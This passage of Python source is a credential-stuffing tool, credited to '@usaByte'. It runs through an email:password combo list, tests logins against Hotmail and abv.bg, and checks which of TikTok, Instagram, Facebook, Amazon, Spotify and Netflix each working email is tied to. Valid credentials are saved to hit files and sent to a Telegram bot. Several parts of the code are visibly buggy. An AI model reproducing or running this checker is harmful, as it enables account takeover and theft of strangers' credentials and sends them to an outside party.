	     					if tik == "✅":
	     						save("tik", "else-hotm", account)
	     						save("all", "else-hotm", mes)
	     						ttok = "{ tik "
	     					else:
	     						ttok = "{"
	     						pass
	     						
	     					if insta == "✅":
	     						save("insta", "else-hotm", account)
	     						save("all", "else-hotm", mes)
	     						t1ok = "| insta "
	     					else:
	     						t1ok = ""
	     						pass
	     					
	     					if face == "✅":
	     						save("face", "else-hotm", account)
	     						save("all", "else-hotm", mes)
	     						t2ok = "| face "
	     					else:
	     						t2ok = ""
	     						pass
	     					
	     					if twiter == "✅":
	     						save("twitter", "else-hotm", account)
	     						save("all", "else-hotm", mes)
	     						t3ok = "| twitter "
	     					else:
	     						t3ok = ""
	     						pass
	     						
	     					if amzon == "✅":
	     						save("amzon", "else-hotm", account)
	     						save("all", "else-hotm", mes)
	     						t4ok = "| amzon "
	     					else:
	     						t4ok = ""
	     						pass
	     					
	     					if spotify == "✅":
	     						save("spotify", "else-hotm", account)
	     						save("all", "else-hotm", mes)
	     						t5ok = "| spotify "
	     					else:
	     						t5ok = ""
	     						pass
	     					
	     					if netflix == "✅":
	     						save("netflix", "else-hotm", account)
	     						save("all", "else-hotm", mes)
	     						t6ok = "| netflix "
	     					else:
	     						t6ok = "}"
	     						pass
	     					
	     					bott.send_message(chat_id=ID, text=f"""{account} | type = {dom} | linked : {ttok}{t1ok}{t2ok}{t3ok}{t4ok}{t5ok}{t6ok} | by : @usaByte""")
	     					print(f"{Fore.YELLOW}{account}")
	     					
	if s == int("2"):
	     		print("start .......")
	     		while True:
	     			for whis in open(path,'r').read().splitlines():
	     				acc=str(whis)
	     				acc=acc.split('\n')[0]
	     				email=acc.split(':')[0]
	     				psw=acc.split(':')[1]
	     				account = email + ":" + psw
	     				dom = abv(account)
	     				if dom == True:
	     					tik = em_tik(email)
	     					insta = em_insta(email)
	     					face = em_face(email)
	     					twiter = twiter(email)
	     					amzon = em_amazon(email)
	     					spotify = em_spotify(email)
	     					netflix = em_ntflix
	     					mes = f"""{account} | type = {dom} | linked : {ttok}{t1ok}{t2ok}{t3ok}{t4ok}{t5ok}{t6ok} | by : @usaByte"""
	     					if tik == "✅":
	     						save("tik", "hit-abv", account)
	     						save("all", "hit-abv", mes)
	     						ttok = "{ tik "
	     					else:
	     						ttok = "{"
	     						pass
	     						
	     					if insta == "✅":
	     						save("insta", "hit-abv", account)
	     						save("all", "hit-abv", mes)
	     						t1ok = "| insta "
	     					else:
	     						t1ok = ""
	     						pass
	     					
	     					if face == "✅":
	     						save("face", "hit-abv", account)
	     						save("all", "hit-abv", mes)
	     						t2ok = "| face "
	     					else:
	     						t2ok = ""
	     						pass
	     					
	     					if twiter == "✅":
	     						save("twitter", "hit-abv", account)
	     						save("all", "hit-abv", mes)
	     						t3ok = "| twitter "
	     					else:
	     						t3ok = ""
	     						pass
	     						
	     					if amzon == "✅":
	     						save("amzon", "hit-abv", account)
	     						save("all", "hit-abv", mes)
	     						t4ok = "| amzon "
	     					else:
	     						t4ok = ""
	     						pass
	     					
	     					if spotify == "✅":
	     						save("spotify", "hit-abv", account)
	     						save("all", "hit-abv", mes)
	     						t5ok = "| spotify "
	     					else:
	     						t5ok = ""
	     						pass
	     					
	     					if netflix == "✅":
	     						save("netflix", "hit-abv", account)
	     						save("all", "hit-abv", mes)
	     						t6ok = "| netflix "
	     					else:
	     						t6ok = "}"
	     						pass
	     					
	     					bott.send_message(chat_id=ID, text=f"""{account} | type = {dom} | linked : {ttok}{t1ok}{t2ok}{t3ok}{t4ok}{t5ok}{t6ok} | by : @usaByte""")
	     					print(f"{Fore.GREEN}{account}")
	     				
	     				
	     				else:
	     					print(f"- {Fore.RED}{account}")
	     					
def main():
	s = int(input(""" welcome to my tool \n\n tik : __fl | tele: pppiqi

1- email domain {abv.bg} - {Hotmail}
- insta
- tik
- face
- amazon
- netflix
- spotify

enter 1- hotmail
      2- abv.bg :"""))
	path=input(f'[+] Combo List Path : ')
	hit_false = 0
	hit_True = 0
	all = 0
	if s == int("1"):
	     		print("start .......")
	     		while True:
	     			for whis in open(path,'r').read().splitlines():
	     				acc=str(whis)
	     				acc=acc.split('\n')[0]
	     				email=acc.split(':')[0]
	     				psw=acc.split(':')[1]
	     				account = email + ":" + psw
	     				dom = hotm1(account)
	     				if dom == False or dom == None:
	     					
	     					print(f"wrong email ....{account}")
	     					all += 1
	     					hit_false += 1
	     				elif dom == "2fa-2" or dom == "2fa-1":
	     					
	     					hit_True += 1
	     					all += 1
	     					print(" True dom")
	     					c1 = em_tik(email)
	     					if c1 == "✅":
	     						with open("tik-2fa.txt", "a", encoding="utf-8", errors="ignore") as f:
	     						    f.write(f"{account}\n")
	     						    f.close()
	     					c2 = em_amazon(email)
	     					if c2 == "✅":
	     						with open("amazon-2fa.txt", "a", encoding="utf-8", errors="ignore") as f:
	     						    f.write(f"{account}\n")
	     						    f.close()
	     					c3 = em_face(email)
	     					if c3 == "✅":
	     						with open("face-2fa.txt", "a", encoding="utf-8", errors="ignore") as f:
	     						    f.write(f"{account}\n")
	     						    f.close()
	     					c4 = em_insta(email)
	     					if c4 == "✅":
	     						with open("insta-2fa.txt", "a", encoding="utf-8", errors="ignore") as f:
	     						    f.write(f"{account}\n")
	     						    f.close()
	     					print("good44444r")#
	     					c5 = em_spotify(email)
	     					if c5 == "✅":
	     						with open("spotify-2fa.txt", "a", encoding="utf-8", errors="ignore") as f:
	     						    f.write(f"{account}\n")
	     						    f.close()
	     					c6 = em_ntflix(email)
	     					if c6 == "✅":
	     						with open("netflix-2fa.txt", "a", encoding="utf-8", errors="ignore") as f:
	     						    f.write(f"{account}\n")
	     						    f.close()
	     					print(f"""New Hit !!

email : {email}
pasword : {psw}
tik : {c1}
face : {c3}
insta : {c4}
netfiex : {c6}
spotify : {c5}
amazon : {c2}
if True == linked
if maybe == linked - not linked
if False == not linked
Dev : @usaByte
hits = {hit_True}""")
	     					with open("2fa-all.txt", "a", encoding="utf-8", errors="ignore") as f:
	     						
	     						f.write(f"""{account} | type =={dom} | tik ={c1} | insta ={c4} | facebook ={c3} | Netflix ={c6} | amazon ={c2} | spotify ={c5} | by : @usaByte\n""")
	     						f.close()
	     					
	     					bot.send_message(chat_id=ID, text=f"""{account} | type =={dom} | tik ={c1} | insta ={c4} | facebook ={c3} | Netflix ={c6} | amazon ={c2} | spotify ={c5} | by : @usaByte""")
	     				elif dom == "hit1" or dom == "hit2":
	     					
	     					hit_True += 1
	     					all += 1
	     					print(" True dom")
	     					c1 = em_tik(email)
	     					if c1 == "✅":
	     						with open("tik-hit.txt", "a", encoding="utf-8", errors="ignore") as f:
	     						    f.write(f"{account}\n")
	     						    f.close()
	     					c2 = em_amazon(email)
	     					if c2 == "✅":
	     						with open("amazon-hit.txt", "a", encoding="utf-8", errors="ignore") as f:
	     						    f.write(f"{account}\n")
	     						    f.close()
	     					c3 = em_face(email)
	     					if c3 == "✅":
	     						with open("face-hit.txt", "a", encoding="utf-8", errors="ignore") as f:
	     						    f.write(f"{account}\n")
	     						    f.close()
	     					c4 = em_insta(email)
	     					if c4 == "✅":
	     						with open("insta-hit.txt", "a", encoding="utf-8", errors="ignore") as f:
	     						    f.write(f"{account}\n")
	     						    f.close()
	     					print("good44444r")#
	     					c5 = em_spotify(email)
	     					if c5 == "✅":
	     						with open("spotify-hit.txt", "a", encoding="utf-8", errors="ignore") as f:
	     						    f.write(f"{account}\n")
	     						    f.close()
	     					c6 = em_ntflix(email)
	     					if c6 == "✅":
	     						with open("netflix-hit.txt", "a", encoding="utf-8", errors="ignore") as f:
	     						    f.write(f"{account}\n")
	     						    f.close()
	     						    
	     					print(f"""New Hit !!

email : {email}
pasword : {psw}
tik : {c1}
face : {c3}
insta : {c4}
netfiex : {c6}
spotify : {c5}
amazon : {c2}
if True == linked
if maybe == linked - not linked
if False == not linked
Dev : @usaByte
hits = {hit_True}""")
	     					with open("hit-all.txt", "a", encoding="utf-8", errors="ignore") as f:
	     						
	     						f.write(f"""{account} | type =={dom} | tik ={c1} | insta ={c4} | facebook ={c3} | Netflix ={c6} | amazon ={c2} | spotify ={c5} | by : @usaByte\n""")
	     						f.close()
	     					bot.send_message(chat_id=ID, text=f"""{account} | type =={dom} | tik ={c1} | insta ={c4} | facebook ={c3} | Netflix ={c6} | amazon ={c2} | spotify ={c5} | by : @usaByte""")

	     				else:
	     					
	     					hit_True += 1
	     					all += 1
	     					print(" True dom")
	     					c1 = em_tik(email)
	     					if c1 == "✅":
	     						with open("tik-else.txt", "a", encoding="utf-8", errors="ignore") as f:
	     						    f.write(f"{account} | {dom}\n")
	     						    f.close()
	     					c2 = em_amazon(email)
	     					if c2 == "✅":
	     						with open("amazon-else.txt", "a", encoding="utf-8", errors="ignore") as f:
	     						    f.write(f"{account} | {dom} \n")
	     						    f.close()
	     					c3 = em_face(email)
	     					if c3 == "✅":
	     						with open("face-else.txt", "a", encoding="utf-8", errors="ignore") as f:
	     						    f.write(f"{account} | {dom}\n")
	     						    f.close()
	     					c4 = em_insta(email)
	     					if c4 == "✅":
	     						with open("insta-else.txt", "a", encoding="utf-8", errors="ignore") as f:
	     						    f.write(f"{account} | {dom}\n")
	     						    f.close()
	     					print("good44444r")#
	     					c5 = em_spotify(email)
	     					if c5 == "✅":
	     						with open("spotify-else.txt", "a", encoding="utf-8", errors="ignore") as f:
	     						    f.write(f"{account} | {dom}\n")
	     						    f.close()
	     					c6 = em_ntflix(email)
	     					if c6 == "✅":
	     						with open("netflix-else.txt", "a", encoding="utf-8", errors="ignore") as f:
	     						    f.write(f"{account} | {dom}\n")
	     						    f.close()
	     						  
	     					print(f"""New Hit !!

email : {email}
pasword : {psw}
tik : {c1}
face : {c3}
insta : {c4}
netfiex : {c6}
spotify : {c5}
amazon : {c2}
if True == linked
if maybe == linked - not linked
if False == not linked
Dev : @usaByte
hits = {hit_True}
hit False = {hit_false}
all = {all}""")
	     					with open("else_all.txt", "a", encoding="utf-8", errors="ignore") as f:
	     						
	     						f.write(f"""{account} | type =={dom} | tik ={c1} | insta ={c4} | facebook ={c3} | Netflix ={c6} | amazon ={c2} | spotify ={c5} | by : @usaByte\n""")
	     						f.close()
	     					bot.send_message(chat_id=ID, text=f"""{account} | type =={dom} | tik ={c1} | insta ={c4} | facebook ={c3} | Netflix ={c6} | amazon ={c2} | spotify ={c5} | by : @usaByte""")
	     		
	elif s == int("2"):
	     		print("start .......")
	     		while True:
	     			for whis in open(path,'r').read().splitlines():
	     				acc=str(whis)
	     				acc=acc.split('\n')[0]
	     				email=acc.split(':')[0]
	     				psw=acc.split(':')[1]
	     				account = email + ":" + psw
	     				dom = abv(account)
	     				if dom == True:
	     					
	     					print("True dom")
	     					c1 = em_tik(email)
	     					
	     					c2 = em_amazon(email)
	     					c3 = em_face(email)
	     					c4 = em_insta(email)
	     					c5 = em_spotify(email)
	     					c6 = em_ntflix(email)
	     					print(f"""New Hit !!

email : {email}
pasword : {psw}
tik : {c1}
face : {c3}
insta : {c4}
netfiex : {c6}
spotify : {c5}
amazon : {c2}
if True == linked
if maybe == linked - not linked
if False == not linked
Dev : @usaByte
""")
	     					bot.send_message(chat_id=ID, text=f"""New Hit !!

email : {email}
pasword : {psw}
tik : {c1}
face : {c3}
insta : {c4}
netfiex : {c6}
spotify : {c5}
amazon : {c2}
if True == linked
if maybe == linked - not linked
if False == not linked
Dev : @usaByte
""")
	     					bot.send_message(chat_id=ID, text=f"""{account} | tik ={c1} | insta ={c4} | facebook ={c3} | Netflix ={c6} | amazon ={c2} | spotify ={c5} | by : @usaByte""")

	     				elif dom == False:
	     					print(f"wrong email ....{account}")
main()
